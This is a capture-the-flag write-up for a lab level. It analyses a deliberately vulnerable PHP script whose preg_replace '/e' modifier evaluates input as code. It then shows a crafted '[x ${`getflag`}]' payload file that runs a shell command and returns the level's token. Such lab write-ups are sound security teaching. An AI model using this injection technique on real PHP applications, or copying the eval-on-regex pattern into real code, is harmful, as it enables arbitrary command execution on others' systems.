## Level 06: PHP Regex Injection Vulnerability

### Goal
Exploit a PHP regex vulnerability in a web application to execute arbitrary commands and retrieve the flag.

## Steps

### I - Analysis

1. **Initial Discovery**  
After logging in, we find two files in the directory:
- `level06` (executable binary)
- `level06.php` (PHP script)

2. **Initial Testing**  
When executing the binary `level06`, we get:
```bash
PHP Warning: file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

3. **Source Code Analysis**  
Examining `level06.php` reveals:
```php
#!/usr/bin/php
<?php
function y($m) { 
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m; 
}

function x($y, $z) { 
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

### II - Code Breakdown

1. **Script Structure**  
- Takes two command-line arguments: `$argv[1]` and `$argv[2]`
- Contains two functions: `x()` and `y()`

2. **Function x() Analysis**  
- Reads file content using `file_get_contents($y)`
- Performs three regex replacements:
	1. Matches `[x ...]` patterns and processes them with function y()
	2. Replaces `[` with `(`
	3. Replaces `]` with `)`

3. **Function y() Analysis**  
- Performs two string replacements:
	1. Replaces `.` with ` x `
	2. Replaces `@` with ` y`

### III - Vulnerability Analysis

The vulnerability lies in the regex replacement using the `/e` modifier:
```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

Key points:
- The `/e` modifier in PHP causes the replacement string to be evaluated as PHP code
- This allows for arbitrary code execution through carefully crafted input
- PHP's `${}` syntax can be used for shell command execution

### IV - Exploitation

1. **Create Exploit File**
   Create a temporary file containing the payload:
   ```bash
   echo '[x ${`getflag`}]' > /tmp/flag06
   ```

2. **Execute the Exploit**
   Run the binary with our payload file:
   ```bash
   ./level06 /tmp/flag06
   ```
   Output:
   ```bash
   PHP Notice: Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
    in /home/user/level06/level06.php(4) : regexp code on line 1
   ```